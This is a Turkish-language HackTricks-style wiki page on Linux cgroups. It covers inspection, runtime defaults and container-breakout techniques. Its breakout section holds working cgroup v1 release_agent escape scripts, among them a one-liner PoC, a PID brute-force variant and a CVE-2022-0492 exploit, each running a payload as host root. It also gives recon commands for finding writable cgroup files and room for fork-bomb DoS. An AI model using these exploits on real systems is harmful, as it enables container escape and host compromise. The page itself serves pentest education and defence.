# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Genel Bakış

Linux **control groups**, accounting, sınırlama, önceliklendirme ve policy enforcement amacıyla process'leri birlikte gruplamak için kullanılan kernel mekanizmasıdır. Namespaces temel olarak kaynakların görünümünü izole etmeye odaklanırken, cgroups temel olarak bir process grubunun bu kaynaklardan **ne kadarını** tüketebileceğini ve bazı durumlarda **hangi kaynak sınıflarıyla** etkileşime girebileceğini yönetmeye odaklanır. Containers, kullanıcı bunlara doğrudan bakmasa bile sürekli olarak cgroups'a dayanır; çünkü neredeyse her modern runtime, kernel'e "bu process'ler bu workload'a ait ve bunlara uygulanacak kaynak kuralları bunlar" demenin bir yoluna ihtiyaç duyar.

Bu nedenle container engine'leri yeni bir container'ı kendi cgroup subtree'si içine yerleştirir. Process tree buraya yerleştirildikten sonra runtime; memory kullanımını sınırlandırabilir, PID sayısını kısıtlayabilir, CPU kullanımına ağırlık verebilir, I/O'yu düzenleyebilir ve device erişimini kısıtlayabilir. Production environment'ta bu, hem multi-tenant güvenliği hem de temel operational hygiene için gereklidir. Anlamlı resource control'lara sahip olmayan bir container; memory'yi tüketebilir, sistemi process'lerle doldurabilir veya CPU ve I/O'yu host'u ya da komşu workload'ları kararsızlaştıracak şekilde tekeline alabilir.

Security açısından cgroups iki ayrı nedenle önemlidir. İlk olarak, kötü veya eksik resource limit'leri doğrudan denial-of-service saldırılarına olanak tanır. İkinci olarak, özellikle eski **cgroup v1** kurulumlarındaki bazı cgroup özellikleri, container içinden yazılabilir olduklarında tarihsel olarak güçlü breakout primitive'leri oluşturmuştur.

## v1 ve v2

Kullanımda olan iki ana cgroup modeli vardır. **cgroup v1**, birden fazla controller hierarchy sunar ve eski exploit writeup'ları çoğunlukla burada bulunan garip ve bazen gereğinden fazla güçlü semantic'ler etrafında şekillenir. **cgroup v2** daha unified bir hierarchy ve genel olarak daha temiz bir behavior sunar. Modern distribution'lar giderek cgroup v2'yi tercih ediyor; ancak mixed veya legacy environment'lar hâlâ mevcut. Bu da gerçek sistemleri incelerken her iki modelin de hâlâ önemli olduğu anlamına gelir.

Bu fark önemlidir; çünkü **`release_agent`**'ın cgroup v1'de abuse edilmesi gibi en ünlü container breakout hikâyelerinden bazıları, özellikle eski cgroup behavior'ına bağlıdır. Bir blog'da cgroup exploit'i gören ve bunu modern, yalnızca cgroup v2 kullanan bir sisteme düşünmeden uygulayan okuyucunun, hedefte gerçekte nelerin mümkün olduğunu yanlış anlaması olasıdır.

## İnceleme

Mevcut shell'inizin nerede bulunduğunu görmenin en hızlı yolu şudur:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` dosyası, mevcut process ile ilişkili cgroup yollarını gösterir. Modern bir cgroup v2 host üzerinde genellikle unified entry görürsünüz. Daha eski veya hybrid hostlarda birden fazla v1 controller yolu görebilirsiniz. Yolu öğrendikten sonra limitleri ve mevcut kullanımı görmek için `/sys/fs/cgroup` altındaki ilgili dosyaları inceleyebilirsiniz.

Bir cgroup v2 host üzerinde aşağıdaki komutlar kullanışlıdır:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Bu dosyalar, hangi controller'ların mevcut olduğunu ve hangilerinin child cgroup'lara devredildiğini gösterir. Bu delegation modeli, rootless ve systemd-managed ortamlarda önemlidir; runtime yalnızca parent hierarchy'nin gerçekten devrettiği cgroup işlevleri alt kümesini kontrol edebilir.

## Lab

Cgroup'ları pratikte gözlemlemenin bir yolu, memory-limited bir container çalıştırmaktır:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID ile sınırlı bir container da deneyebilirsiniz:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Bu örnekler, runtime flag'ini kernel dosya arayüzüne bağlamaya yardımcı oldukları için kullanışlıdır. Runtime kuralı sihirli bir şekilde uygulamaz; ilgili cgroup ayarlarını yazar ve ardından kernel'in bunları process tree'ye karşı uygulamasına izin verir.

## Runtime Kullanımı

Docker, Podman, containerd ve CRI-O, normal işlemlerinin bir parçası olarak cgroup'lara güvenir. Aralarındaki farklar genellikle cgroup kullanıp kullanmadıklarıyla değil, **hangi varsayılanları seçtikleri**, **systemd ile nasıl etkileşime girdikleri**, **rootless delegation'ın nasıl çalıştığı** ve **yapılandırmanın ne kadarının engine seviyesi yerine orchestration seviyesi tarafından kontrol edildiği** ile ilgilidir.

Kubernetes'te resource request'leri ve limit'leri sonunda node üzerindeki cgroup yapılandırmasına dönüşür. Pod YAML'dan kernel enforcement'a giden yol kubelet, CRI runtime ve OCI runtime üzerinden geçer; ancak kuralı nihai olarak uygulayan kernel mekanizması yine cgroup'lardır. Incus/LXC ortamlarında da cgroup'lar yoğun şekilde kullanılır; özellikle system container'lar genellikle daha zengin bir process tree ve VM'e daha çok benzeyen operasyonel beklentiler sunduğu için.

## Yanlış Yapılandırmalar ve Breakout'lar

Klasik cgroup security hikâyesi, yazılabilir **cgroup v1 `release_agent`** mekanizmasıdır. Bu modelde attacker doğru cgroup dosyalarına yazabilir, `notify_on_release` özelliğini etkinleştirebilir ve `release_agent` içinde saklanan path'i kontrol edebilirse, cgroup boşaldığında kernel host üzerindeki initial namespaces içinde attacker tarafından seçilen bir path'i çalıştırabilir. Eski writeup'ların cgroup controller yazılabilirliğine, mount seçeneklerine ve namespace/capability koşullarına bu kadar fazla önem vermesinin nedeni budur.

`release_agent` kullanılabilir olmasa bile cgroup hataları önemini korur. Aşırı geniş device erişimi, host device'larının container içinden erişilebilir olmasına neden olabilir. Eksik memory ve PID limit'leri, basit bir code execution'ı host DoS'una dönüştürebilir. Rootless senaryolarındaki zayıf cgroup delegation da defender'ları bir kısıtlamanın mevcut olduğuna inandırabilir; oysa runtime bu kısıtlamayı hiçbir zaman gerçekten uygulayamamıştır.

### `release_agent` Arka Planı

`release_agent` tekniği yalnızca **cgroup v1** için geçerlidir. Temel fikir şudur: Bir cgroup içindeki son process çıktığında ve `notify_on_release=1` ayarlandığında, kernel path'i `release_agent` içinde saklanan programı çalıştırır. Bu çalıştırma **host üzerindeki initial namespaces** içinde gerçekleşir; yazılabilir bir `release_agent`'ı container escape primitive'ine dönüştüren şey de budur.

Tekniğin çalışması için attacker'ın genel olarak şunlara ihtiyacı vardır:

- yazılabilir bir **cgroup v1** hierarchy
- bir child cgroup oluşturma veya kullanma yeteneği
- `notify_on_release` ayarlama yeteneği
- `release_agent` içine bir path yazma yeteneği
- host bakış açısından executable olarak çözümlenen bir path

### Klasik PoC

Tarihsel one-liner PoC şöyledir:<sup>[[1]](#references)</sup>
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Bu PoC, `release_agent` içine bir payload path yazar, cgroup release işlemini tetikler ve ardından host üzerinde oluşturulan çıktı dosyasını geri okur.

### Okunabilir Adım Adım Açıklama

Aynı fikir, adımlara ayrıldığında daha kolay anlaşılır.<sup>[[1]](#references)</sup>

1. Yazılabilir bir cgroup oluşturun ve hazırlayın:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Container filesystem'a karşılık gelen host path'i belirleyin:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Host path üzerinden görülebilecek bir payload bırakın:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup'u boş hale getirerek çalıştırmayı tetikleyin:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Etki, payload'ın host tarafında host root privileges ile çalıştırılmasıdır. Gerçek bir exploit'te payload genellikle bir proof file yazar, reverse shell başlatır veya host state'i değiştirir.

### `/proc/<pid>/root` Kullanılan Relative Path Variant

Bazı ortamlarda container filesystem için host path açık değildir veya storage driver tarafından gizlenir. Bu durumda payload path, `/proc/<pid>/root/...` üzerinden ifade edilebilir; burada `<pid>`, mevcut container içindeki bir prosese ait host PID'sidir. Relative-path brute-force variant'ının temeli budur:<sup>[[2]](#references)</sup>
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Buradaki ilgili trick brute force değil, path formudur: `/proc/<pid>/root/...`, doğrudan host storage path'i önceden bilinmese bile kernel'in container filesystem içindeki bir dosyayı host namespace üzerinden çözümlemesine olanak tanır.

### CVE-2022-0492 Variant

2022'de CVE-2022-0492, cgroup v1 içindeki `release_agent` üzerine yazma işleminin **initial** user namespace içindeki `CAP_SYS_ADMIN` yetkisini doğru şekilde kontrol etmediğini gösterdi. Bu durum, teknik yöntemin vulnerable kernel'lerde çok daha erişilebilir olmasını sağladı; çünkü bir cgroup hierarchy mount edebilen container process'i, host user namespace içinde önceden privileged olmadan `release_agent` üzerine yazabiliyordu.<sup>[[3]](#references)</sup>

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Savunmasız bir kernel üzerinde host, `/proc/self/exe` dosyasını host root yetkileriyle çalıştırır.

Pratik kötüye kullanım için öncelikle ortamın hâlâ yazılabilir cgroup-v1 yollarını veya tehlikeli cihaz erişimini açığa çıkarıp çıkarmadığını kontrol edin:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
`release_agent` mevcut ve yazılabilirse, zaten legacy-breakout alanındasınız:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
cgroup path'in kendisi bir escape sağlamıyorsa, bir sonraki pratik kullanım genellikle denial of service veya reconnaissance'tır:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Bu komutlar, workload'un fork-bomb çalıştırmak, agresif şekilde bellek tüketmek veya yazılabilir bir legacy cgroup arayüzünü kötüye kullanmak için yeterli alana sahip olup olmadığını hızlıca gösterir.

## Kontroller

Bir hedefi incelerken cgroup kontrollerinin amacı, hangi cgroup modelinin kullanıldığını, container'ın yazılabilir controller yollarını görüp görmediğini ve `release_agent` gibi eski breakout primitive'lerinin gerçekten ilgili olup olmadığını öğrenmektir.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Burada ilgi çekici olanlar:

- `mount | grep cgroup` çıktısı **cgroup v1** gösteriyorsa eski breakout yazıları daha ilgili hâle gelir.
- `release_agent` mevcutsa ve erişilebilirse, bu durum derhâl daha derin bir incelemeye değer.
- Görünür cgroup hiyerarşisi yazılabilirse ve container ayrıca güçlü capabilities değerlerine sahipse, ortam çok daha yakından incelenmelidir.

**cgroup v1**, yazılabilir controller mount'ları ve ayrıca güçlü capabilities değerlerine veya zayıf seccomp/AppArmor korumasına sahip bir container keşfederseniz, bu kombinasyon dikkatle incelenmelidir. cgroup'lar çoğunlukla sıkıcı bir kaynak yönetimi konusu olarak görülür; ancak geçmişte, "kaynak kontrolü" ile "host üzerinde etki" arasındaki sınırın insanların varsaydığı kadar net olmaması nedeniyle, en öğretici container escape zincirlerinden bazılarının parçası olmuşlardır.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Container'lar otomatik olarak cgroup'lara yerleştirilir; `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` flag'leriyle ayarlanmadıkça kaynak limitleri isteğe bağlıdır | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` seçeneklerini belirtmemek; `--device`; `--privileged` |
| Podman | Varsayılan olarak etkin | `--cgroups=enabled` varsayılandır; cgroup namespace varsayılanları cgroup sürümüne göre değişir (cgroup v2'de `private`, bazı cgroup v1 kurulumlarında `host`) | `--cgroups=disabled`, `--cgroupns=host`, gevşetilmiş device erişimi, `--privileged` |
| Kubernetes | Varsayılan olarak runtime üzerinden etkin | Pod'lar ve container'lar node runtime tarafından cgroup'lara yerleştirilir; ayrıntılı kaynak kontrolü `resources.requests` / `resources.limits` değerlerine bağlıdır | Kaynak request/limit değerlerini belirtmemek, ayrıcalıklı device erişimi, host seviyesinde runtime yanlış yapılandırması |
| containerd / CRI-O | Varsayılan olarak etkin | cgroup'lar normal yaşam döngüsü yönetiminin bir parçasıdır | Device kontrollerini gevşeten veya eski yazılabilir cgroup v1 arayüzlerini açığa çıkaran doğrudan runtime yapılandırmaları |

Önemli ayrım şudur: **cgroup'ların mevcut olması** genellikle varsayılandır; buna karşılık **kullanışlı kaynak kısıtlamaları**, açıkça yapılandırılmadıkça çoğunlukla isteğe bağlıdır.

## Referanslar

- [1] [Docker container escape'lerini anlamak](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [2] [Privileged Container Escape - Control Groups release_agent](http://blog.ajxchapman.com/containers/2020/11/19/privileged-container-escape.html)
- [3] [Cgroups'ı Etkileyen Yeni Linux Güvenlik Açığı CVE-2022-0492: Container'lar Escape Yapabilir mi?](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)

{{#include ../../../../banners/hacktricks-training.md}}
